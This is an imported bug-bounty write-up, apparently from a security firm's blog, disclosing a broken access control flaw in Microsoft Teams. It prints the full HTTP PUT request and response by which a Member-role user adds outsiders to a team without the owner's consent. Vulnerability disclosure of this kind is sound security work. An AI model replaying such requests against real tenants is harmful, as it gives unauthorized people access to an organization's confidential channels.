---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2021-12-07_privilege-escalation-in-microsoft-teams.md
original_filename: 2021-12-07_privilege-escalation-in-microsoft-teams.md
title: Privilege Escalation in Microsoft Teams
category: documents
detected_topics:
- access-control
- cors
- cloud-security
- command-injection
- mfa
- otp
tags:
- imported
- documents
- access-control
- cors
- cloud-security
- command-injection
- mfa
- otp
language: en
raw_sha256: 443e25ed2c4bc6844863c601ff408c8eb9dbd97b4d36ce6b1c45c24e2a845406
text_sha256: a994e297e9fbe0c25441b21f521a7f58b311326621053bbf78d7cc3ca2363aef
ingested_at: '2026-06-28T07:32:08Z'
sensitivity: unknown
redactions_applied: true
---

# Privilege Escalation in Microsoft Teams

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2021-12-07_privilege-escalation-in-microsoft-teams.md
- Source Type: markdown
- Detected Topics: access-control, cors, cloud-security, command-injection, mfa, otp
- Ingested At: 2026-06-28T07:32:08Z
- Redactions Applied: True
- Raw SHA256: `443e25ed2c4bc6844863c601ff408c8eb9dbd97b4d36ce6b1c45c24e2a845406`
- Text SHA256: `a994e297e9fbe0c25441b21f521a7f58b311326621053bbf78d7cc3ca2363aef`


## Content

---
title: "Privilege Escalation in Microsoft Teams"
page_title: "Privilege Escalation in Microsoft Teams | Agilehunt's Blog - Guarding your innovation"
url: "https://blog.agilehunt.com/blogs/security/privilege-escalation-in-microsoft-teams-2021"
final_url: "https://blog.agilehunt.com/blogs/security/privilege-escalation-in-microsoft-teams-2021"
authors: ["Vikas Anil Sharma (@vikzsharma)"]
programs: ["Microsoft"]
bugs: ["Privilege escalation", "Broken Access Control"]
publication_date: "2021-12-07"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 3106
---

Published on
  Tuesday, December 7, 2021

# Privilege Escalation in Microsoft Teams

Authors
  

  * ![avatar](/_next/image?url=%2Fstatic%2Fimages%2Favatar.png&w=96&q=75)

Name
  Vikas Anil Sharma
Twitter
  [@vikzsharma](https://twitter.com/vikzsharma)

![tailwind-nextjs-banner](/_next/image?url=%2Fstatic%2Fimages%2Ftwitter-card.png&w=3840&q=75)

IMPORTANT

Don't leave your organization's security to chance. Contact us for a free consultation on how we can fortify your systems.

# Privilege Escalation in Microsoft Teams: A Critical Business Threat

Microsoft Teams is widely used across organizations, but its widespread adoption also makes it a target for malicious actors. Our expert research at **Agilehunt** uncovered a critical privilege escalation vulnerability within Teams, enabling unauthorized users to gain owner-level privileges.

## Vulnerability Overview

During our investigation under Microsoft's Bug Bounty program, we identified a security loophole allowing a user with **Member** privileges to escalate their access to **Owner** privileges. This means sensitive organizational data could be exposed to unauthorized personnel.

* * *

**Risk Breakdown** :

  * **Risk** : **High**
  * **Difficulty** : **Easy**

One small vulnerability can put your entire organization at risk. For example, using the Teams API, we demonstrated how a malicious member could invite unauthorized users into sensitive channels without the owner’s knowledge.

* * *

## Affected URLs

  * `https://teams.microsoft.com/api/mt/part/amer-02/beta/teams/19:HASHID@thread.tacv2/ID/inviteAndAddUser`

* * *

## Steps to Reproduce

The following steps indicate a proof of concept outlined in four(6) steps to reproduce and execute the issue.

**Step 1:** Assuming the Owner has added "[memberrole@example.com](mailto:memberrole@example.com)" with the "Member" role to his Teams.

**Step 2:** Member role user logs in into the teams.microsoft.com. It was observed Member role users didn't have the option to add members or Guests.

**Step 3:** Member role user copies his / her current Cookies, X-Skypetoken & Authorization: Bearer and add it in below POST request which is the request of Adding a new Member role user taken from Owner account for POC purpose :
  
  
  PUT /api/mt/part/amer-02/beta/teams/19:ID@thread.tacv2/ID-c2a5c50/inviteAndAddUser HTTP/1.1
  Host: teams.microsoft.com
  Connection: close
  Content-Length: 106
  x-ms-scenario-id: 393
  x-ms-user-type: user
  X-Client-UI-Language: en-us
  x-ms-client-env: pckgsvc-prod-c2-asse-02
  x-ms-client-type: web
  X-Skypetoken: < Member Role Skype Token >
  Authorization: Bearer < Member Role Authentication Bearer >
  Content-Type: application/json
  Accept: application/json
  User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
  x-ms-client-version: 1415/1.0.0.2020061225
  X-RingOverride: general
  ConsistencyLevel: Organization;ScenarioId=signup
  Origin: https://teams.microsoft.com
  Sec-Fetch-Site: same-origin
  Sec-Fetch-Mode: cors
  Sec-Fetch-Dest: empty
  Accept-Encoding: gzip, deflate
  Accept-Language: en-US,en;q=0.9
  Cookie: Member Role Cookies
  
  {
  "emailAddress": "attackersemail@example.com",
  "displayName": "User-Added-by-Member-Role",
  "userType": "Member"
  }
  
  

Where "[attackersemail@example.com](mailto:attackersemail@example.com)" is the new user that the Malicious Member role user is trying to add.

**Step 4:** Sending the request above below will be the response for the request :
  
  
  HTTP/1.1 404 Not Found
  Cache-Control: no-cache, no-store
  Content-Type: application/json; charset=utf-8
  Vary: Origin,Accept-Encoding
  Access-Control-Allow-Credentials: true
  Access-Control-Allow-Origin: https://teams.microsoft.com
  X-ServerRequestId: ***REDACTED-SUSPECT-TOKEN***  X-MachineName: mtsvc00000I
  Strict-Transport-Security: max-age=31536000; includeSubDomains
  X-MSEdge-Ref: Ref A: 5CB86FA204FE4E68AB9E6C5B34FA307D Ref B: HYD30EDGE0111 Ref C: 2020-06-29T16:04:18Z
  Date: Mon, 29 Jun 2020 16:04:19 GMT
  Connection: close
  Content-Length: 131
  
  {
  "errorCode": "UserNotFoundInSkypeTeam",
  "message": "An unexpected error (Type = UserNotFoundInSkypeTeam) occurred. Please try again."
  }
  
  

**Step 5:** Ignore the response 404 Not Found response above and after checking the inbox of the [attackersemail@example.com](mailto:attackersemail@example.com), It was found that the user still received the invitation to join the Teams.

![](https://cdn.shopify.com/s/files/1/0365/9448/3259/files/Screenshot_1_681b7f1a-4e27-4217-8cf7-b6c0143002d3_large.png?v=1599673801)

**Step 6:** The New user ([attackersemail@example.com](mailto:attackersemail@example.com)) invited by the Member role user now has access to the Teams organization without the Teams Owner's Permission.

## Impact

  * Using this vulnerability the Member role user was able to escalate it's access to the Owner privileged functionality of adding new members to the Teams organization. Breaking the business logic of the application and allowing anyone to see the organizational data in the Teams Channels.

  * The severity of this issue is Critical / High depending on what level of confidential data is being shared in the platform because the Member role users of the team can add new members to the Teams organization without the permission of the Teams Organization Owner.

> **Agilehunt provides tailored security services to ensure your business-critical applications like Microsoft Teams are secured from such vulnerabilities.Get a free security consultation today.**

* * *

## Why This Matters for Your Business

This vulnerability is a perfect example of how attackers can exploit common business applications like Microsoft Teams. At Agilehunt, we specialize in identifying and mitigating such risks through comprehensive penetration testing services.

Our services include:

  * **Web & API Penetration Testing**: Ensure your applications are secure against the latest threats.
  * **Cloud Security Audits** : Protect your sensitive cloud infrastructure.
  * **Network Security Testing** : Identify and fix network vulnerabilities before they can be exploited.

* * *

[Discuss on Twitter](https://mobile.twitter.com/search?q=https%3A%2F%2Fblog.agilehunt.com%2Fblogs%2Fsecurity%2Fprivilege-escalation-in-microsoft-teams-2021)

## Tags

[bug-bounty](/tags/bug-bounty)[security](/tags/security)[microsoft-teams](/tags/microsoft-teams)[cybersecurity](/tags/cybersecurity)

## Next Article

[Race Condition vulnerability in Azure Video Indexer allowed trial account users use Advance / Premium feature](/blogs/security/race-condition-vulnerability-in-azure-video-indexer-allowed-trial-account-users-use-advance-premium-feature)

[← Back to the blog](/blogs)
